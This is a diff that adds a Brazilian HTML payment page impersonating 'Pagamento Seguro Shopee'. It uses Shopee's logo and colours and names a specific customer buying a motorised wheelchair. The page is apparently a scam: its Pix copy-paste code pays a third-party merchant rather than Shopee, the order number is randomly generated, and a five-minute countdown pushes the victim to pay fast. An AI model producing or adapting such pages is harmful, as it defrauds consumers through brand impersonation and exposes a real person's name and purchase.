@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Pagamento Seguro Shopee</title>
+
+<style>
+
+body{
+font-family: Arial, Helvetica, sans-serif;
+background:#f5f5f5;
+margin:0;
+padding:0;
+}
+
+.topo{
+background:#ee4d2d;
+color:white;
+padding:15px;
+text-align:center;
+font-weight:bold;
+font-size:18px;
+}
+
+.logo{
+text-align:center;
+background:white;
+padding:15px;
+border-bottom:1px solid #eee;
+}
+
+.logo img{
+width:130px;
+}
+
+.container{
+max-width:420px;
+margin:15px auto;
+background:white;
+border-radius:10px;
+padding:20px;
+box-shadow:0 2px 10px rgba(0,0,0,0.08);
+}
+
+.status{
+background:#fff6f3;
+border-left:4px solid #ee4d2d;
+padding:12px;
+border-radius:6px;
+font-size:14px;
+margin-bottom:15px;
+}
+
+.timer{
+background:#fff1e6;
+padding:10px;
+border-radius:6px;
+text-align:center;
+margin-bottom:15px;
+font-weight:bold;
+color:#ee4d2d;
+}
+
+.info{
+background:#fafafa;
+padding:12px;
+border-radius:6px;
+margin-bottom:10px;
+font-size:14px;
+}
+
+.pix-box{
+border:1px solid #eee;
+padding:15px;
+border-radius:8px;
+margin-top:15px;
+}
+
+.pix-title{
+font-weight:bold;
+margin-bottom:10px;
+}
+
+textarea{
+width:100%;
+padding:10px;
+height:120px;
+border-radius:6px;
+border:1px solid #ccc;
+font-size:12px;
+}
+
+button{
+width:100%;
+padding:14px;
+background:#ee4d2d;
+color:white;
+border:none;
+border-radius:8px;
+margin-top:10px;
+font-weight:bold;
+font-size:15px;
+cursor:pointer;
+}
+
+button:hover{
+opacity:0.9;
+}
+
+.qr{
+text-align:center;
+margin-top:20px;
+}
+
+.qr img{
+width:200px;
+}
+
+.seguro{
+text-align:center;
+font-size:13px;
+color:#777;
+margin-top:20px;
+}
+
+.footer{
+text-align:center;
+font-size:12px;
+color:#999;
+margin-top:15px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="topo">
+Pagamento Seguro Shopee
+</div>
+
+<div class="logo">
+<img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg">
+</div>
+
+<div class="container">
+
+<div class="status">
+Pedido reservado com sucesso. Efetue o pagamento para liberar envio imediato.
+</div>
+
+<div class="timer">
+Tempo restante: <span id="tempo">05:00</span>
+</div>
+
+<div class="info">
+Pedido Nº: <strong id="pedido"></strong>
+</div>
+
+<div class="info">
+Cliente: EMERSON GOBBI
+</div>
+
+<div class="info">
+Produto: Cadeira De Roda Elétrica Motorizada Dobrável Leve Winner
+</div>
+
+<div class="info">
+Valor: <strong>R$330,00</strong>
+</div>
+
+<div class="pix-box">
+
+<div class="pix-title">
+Chave Pix Copia e Cola
+</div>
+
+<textarea id="pix" readonly onclick="this.select()">00020101021226900014br.gov.bcb.pix2568qrcodes.adopay.com.br/v2/qr/cob/3b06ac9f-e1a4-413f-afe7-07045ecb64805204000053039865802BR5925RLOPES10 COMERCIO DE VARI6009SAO PAULO62070503***6304BF43</textarea>
+
+<button onclick="copiar()">Copiar Chave Pix</button>
+
+</div>
+
+<div class="qr">
+
+<p>Ou pague via QR Code</p>
+
+<img src="pix.png.jpeg">
+
+</div>
+
+<div class="seguro">
+Pagamento seguro via Pix  
+Após confirmação o envio será imediato
+</div>
+
+<div class="footer">
+Shopee Brasil • Pagamento Seguro
+</div>
+
+</div>
+
+<script>
+
+function copiar() {
+var texto = document.getElementById("pix");
+
+texto.select();
+texto.setSelectionRange(0, 99999);
+
+document.execCommand("copy");
+
+alert("Chave Pix copiada com sucesso");
+}
+
+function gerarPedido(){
+let numero = "BR" + Math.floor(Math.random() * 9000000000);
+document.getElementById("pedido").innerText = numero;
+}
+
+gerarPedido();
+
+let tempo = 300;
+
+function contador(){
+
+let minutos = Math.floor(tempo / 60);
+let segundos = tempo % 60;
+
+document.getElementById("tempo").innerHTML =
+(minutos < 10 ? "0" + minutos : minutos) + ":" +
+(segundos < 10 ? "0" + segundos : segundos);
+
+tempo--;
+
+if(tempo < 0){
+tempo = 0;
+}
+
+}
+
+setInterval(contador,1000);
+
+</script>
+
+</body>
+</html>
